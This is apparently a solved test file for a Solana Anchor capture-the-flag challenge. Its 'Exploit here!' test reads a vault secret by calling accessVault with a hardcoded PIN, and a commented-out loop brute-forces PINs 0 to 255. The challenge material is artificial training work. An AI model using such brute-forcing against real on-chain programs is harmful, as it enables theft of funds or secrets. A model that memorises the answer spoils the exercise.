import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Level1 } from "../target/types/level_1";

describe("level-1", () => {
  anchor.setProvider(anchor.AnchorProvider.env());

  const provider = anchor.getProvider();
  
  // Enable Solana logs to capture transaction details
  provider.connection.onLogs('all', (logs) => {
      console.log("Solana Program Logs:", logs);
  });

  const program = anchor.workspace.Level1 as Program<Level1>;

  const explorer = anchor.web3.Keypair.generate();

  before("Prepare", async () => {
    await airdrop(program.provider.connection, explorer.publicKey);

  });

  it("Exploit here!", async () => {
    const [ancientVault,] = anchor.web3.PublicKey.findProgramAddressSync(
      [
        Buffer.from('ancient_vault'),
      ],
      program.programId
    );

    // x x x x x x x x x x x x x x x x x x x x x
    // | | | | | | | | | | | | | | | | | | | | |
    //           ADD YOUR CODE BELOW
    // | | | | | | | | | | | | | | | | | | | | |
    // v v v v v v v v v v v v v v v v v v v v v
    let secret = null;

    // for (let pin = 0; pin <= 255; pin++) {
    //   console.log(`Trying PIN: ${pin}`);
    let pin = 9;
      try {
          await program.methods
              .accessVault(pin)  
              .accounts({
                  explorer: explorer.publicKey,
                  ancientVault: ancientVault,
                  systemProgram: anchor.web3.SystemProgram.programId,
              })
              .signers([explorer])
              .rpc();
  
          const vaultAccount = await program.account.ancientVault.fetch(ancientVault);
  
          if (vaultAccount.secret2) {
            secret = vaultAccount.secret2;
            console.log(`Success! The pin is: ${pin}`);
            console.log(`The secret is: ${secret}`);
        }


      } catch (err) {
          console.log(`Failed for PIN: ${pin} - ${err.toString()}`);
      }
  // }
  
    

    // ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^
    // | | | | | | | | | | | | | | | | | | | | |
    //           ADD YOUR CODE ABOVE
    // | | | | | | | | | | | | | | | | | | | | |
    // x x x x x x x x x x x x x x x x x x x x x


  });
});

async function airdrop(
  connection: any,
  address: any,
  amount = 500_000_000_000
) {
  await connection.confirmTransaction(
    await connection.requestAirdrop(address, amount),
    'confirmed'
  );
}
